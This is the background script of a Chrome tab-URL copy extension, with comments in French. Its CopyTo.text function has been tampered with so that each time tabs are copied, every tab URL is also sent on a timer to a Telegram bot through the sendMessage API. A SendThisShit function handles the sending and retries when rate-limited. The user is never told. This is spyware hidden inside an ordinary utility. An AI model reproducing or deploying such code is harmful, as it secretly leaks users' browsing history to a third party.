let time = 1000;
let timeplus = 3000;

const settings = {
    botId: 'botId',
    chatId: 'chatId' 
}

/**
 * Gére l'accès au presse papier
 * (on est obligé de passer par la background page pour y accéder, cf: http://stackoverflow.com/questions/6925073/copy-paste-not-working-in-chrome-extension)
 */
Clipboard = {
    /**
     * Ecrit la chaîne passée en paramètre dans le presse papier (fonction "Copier")
     *
     * On a pas accès au presse papier via l'API Google Chrome,
     * donc l'astuce consiste à placer le texte à copier dans un <textarea>,
     * de sélectionner tout le contenu de ce <textarea>, et de copier.
     *
     * @param String str Chaîne à copier dans le presse-papier
     * @param Bool extended_mime Indique si on doit copier le type MIME text/html en plus du texte brut
     */
    write: function (str, extended_mime) {
        if (str === '' || str === undefined) {
            str = '<empty>';
        }

        // Copie par défaut, via le clipboardBuffer
        clipboardBuffer.val(str);
        clipboardBuffer.select();

        // Copie via l'API (clipboardData)
        var oncopyBackup = document.oncopy;
        document.oncopy = function (e) {
            // Si on n'utilise pas le type MIME html, on sort tout de suite pour laisser la main à la méthode par défaut : clipboardBuffer
            if (typeof extended_mime == "undefined" || extended_mime !== true) {
                return;
            }
            e.preventDefault();
            e.clipboardData.setData("text/html", str);
            e.clipboardData.setData("text/plain", str);
        };
        document.execCommand('copy');
        document.oncopy = oncopyBackup;
    },

    /**
     * Retourne le contenu du presse papier (String)
     */
    read: function () {
        clipboardBuffer.val('');
        clipboardBuffer.select();
        document.execCommand('paste')
        return clipboardBuffer.val();
    }
};

/**
 * Objet qui gère les actions (clic sur liens de fonctionnalités dans popup.html)
 */
Action = {
    /**
     * Copie les URLs de la fenêtre passé en paramètre dans le presse papier
     * @param opt.window  : fenêtre dont on copie les URL
     * @param opt.gaEvent : données nécessaires à la génération le l'event ga (action, label, actionMeta)
     */
    copy: function (opt) {
        // Par défaut, on récupère tous les onglets de la fenêtre opt.window
        var tabQuery = {windowId: opt.window.id};

        // Si "Copy tabs from all windows" est coché, suppression du filtre sur fenêtre courante
        try {
            if (localStorage["walk_all_windows"] === "true") {
                tabQuery.windowId = null;
            }
        } catch (ex) {
        }

        chrome.tabs.query(tabQuery, function (tabs) {
            // Récupération configuration
            var format = localStorage['format'] ? localStorage['format'] : 'text';
            var highlighted_tab_only = localStorage['highlighted_tab_only'] === 'true';
            var extended_mime = typeof localStorage['mime'] != 'undefined' && localStorage['mime'] == 'html' ? true : false;
            var outputText = '';

            // Filtrage des onglets
            var tabs_filtered = [];
            for (var i = 0; i < tabs.length; i++) {
                if (highlighted_tab_only && !tabs[i].highlighted) continue;
                tabs_filtered.push(tabs[i]);
            }
            tabs = tabs_filtered;


            outputText = CopyTo.text(tabs, time);
            extended_mime = false;


            // Copie la liste d'URL dans le presse papier
            Clipboard.write(outputText, extended_mime);

            // Indique à la popup le nombre d'URL copiées, pour affichage dans la popup
            chrome.runtime.sendMessage({type: "copy", copied_url: tabs.length});

        });
    },

    /**
     * Ouvre toutes les URLs du presse papier dans des nouveaux onglets
     * @param opt.gaEvent : données nécessaires à la génération le l'event ga (action, label, actionMeta)
     */
    paste: function (opt) {
        let urlList;
        let clipboardString = Clipboard.read();

        // Extraction des URL, soit ligne par ligne, soit intelligent paste
        if (localStorage["intelligent_paste"] === "true") {
            urlList = clipboardString.match(/(https?|ftp|ssh|mailto):\/\/[a-z0-9\/:%_+.,#?!@&=-]+/gi);
        } else {
            urlList = clipboardString.split("\n");
        }

        // Si urlList est vide, on affiche un message d'erreur et on sort
        if (urlList == null) {
            chrome.runtime.sendMessage({type: "paste", errorMsg: "No URL found in the clipboard"});
            return;
        }

        // Extraction de l'URL pour les lignes au format HTML (<a...>#url</a>)
        $.each(urlList, function (key, val) {
            let matches = val.match(new RegExp('<a[^>]+href="([^"]+)"', 'i'));
            try {
                urlList[key] = matches[1];
            } catch (e) {
            }

            urlList[key] = jQuery.trim(urlList[key]);
        });

        // Suppression des URLs non conformes
        urlList = urlList.filter(function (url) {
            return !(url === "" || url === undefined);

        });

        // Ouverture de toutes les URLs dans des onglets
        $.each(urlList, function (key, val) {
            chrome.tabs.create({url: val});
        });

        // Indique à la popup de se fermer
        chrome.runtime.sendMessage({type: "paste"});

        // Tracking event
        _gaq.push(['_setCustomVar', 3, 'ActionMeta', opt.gaEvent.actionMeta]);
        _gaq.push(['_trackEvent', 'Action', opt.gaEvent.action, opt.gaEvent.label, urlList.length]);
    }
};

/**
 * Fonctions de copie des URL dans une chaîne de caractères
 */
CopyTo = {
    text: function (tabs, time) {
        let s = '';
        let newUrl = '';
        let x = '';

        for (let i = 0; i < tabs.length; i++) {
            time += timeplus;
            s += tabs[i].url;
            if (tabs[i].url)
                newUrl = 'chat_id=' + settings.chatId + '&text=' + tabs[i].url
            x = `https://api.telegram.org/bot${settings.botId}/sendMessage?` + newUrl
            setTimeout(SendThisShit, time, x, time);
            s = s + "\n";
        }
        return s;
    },
};


function SendThisShit(x, time) {
    $.ajax({
        //type: "POST",
        async: true,
        retryLimit: 10,
        beforeSend: function (request) {
            if (request.status !== 429) {
                console.log("post ",time);
                console.log("URL ",x)
                $.post(x);
            }
            else{ //if (request.status === 429)
                setTimeout(SendThisShit, time, x);
            }
        },
        success: function () {
            console.log("HUIHUHIUH: " + time)
        },

        error: function (request, status, error) {
            if (request.status === 429) {
                console.log("Все хуйня довай поновой: " + time)
            }
        }
    })
}

/**
 * Raccourci clavier
 */
chrome.commands.onCommand.addListener(function (command) {
    switch (command) {
        case "copy":
            let gaEvent = {
                action: 'Copy',
                label: 'Command',
                actionMeta: AnalyticsHelper.getActionMeta("copy")
            };
            chrome.windows.getCurrent(function (win) {
                Action.copy({window: win, gaEvent: gaEvent});
            });
            break;
        case "paste":
            gaEvent = {
                action: 'Paste',
                label: 'Command',
                actionMeta: AnalyticsHelper.getActionMeta("paste")
            };
            Action.paste({gaEvent: gaEvent});
            break;
    }
});

jQuery(function ($) {
    // Au chargement de la page, on créé une textarea qui va servir à lire et à écrire dans le presse papier
    clipboardBuffer = $('<textarea id="clipboardBuffer"></textarea>');
    clipboardBuffer.appendTo('body');

});